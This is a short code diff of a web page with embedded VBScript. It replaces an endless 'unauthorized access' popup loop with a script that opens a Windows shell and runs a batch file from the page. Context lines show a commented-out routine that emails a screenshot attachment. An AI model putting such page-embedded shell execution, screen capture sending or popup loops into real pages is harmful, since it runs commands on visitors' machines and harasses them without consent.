@@ -29,7 +29,9 @@ emailObj.AddAttachment scriptdir & "\screenshot.png"
 emailObj.Send
 </SCRIPT>-->
 <SCRIPT LANGUAGE="VBScript">
-do
-x=msgbox("This popup was created by a website" ,0, "Unautherized access, I guess")
-loop
+Set oShell = WScript.CreateObject("WSCript.shell")
+oShell.run "cmd cd /d C:dir_test\file_test & sanity_check_env.bat arg1"
+rem do
+rem x=msgbox("This popup was created by a website" ,0, "Unautherized access, I guess")
+rem loop
 </SCRIPT>
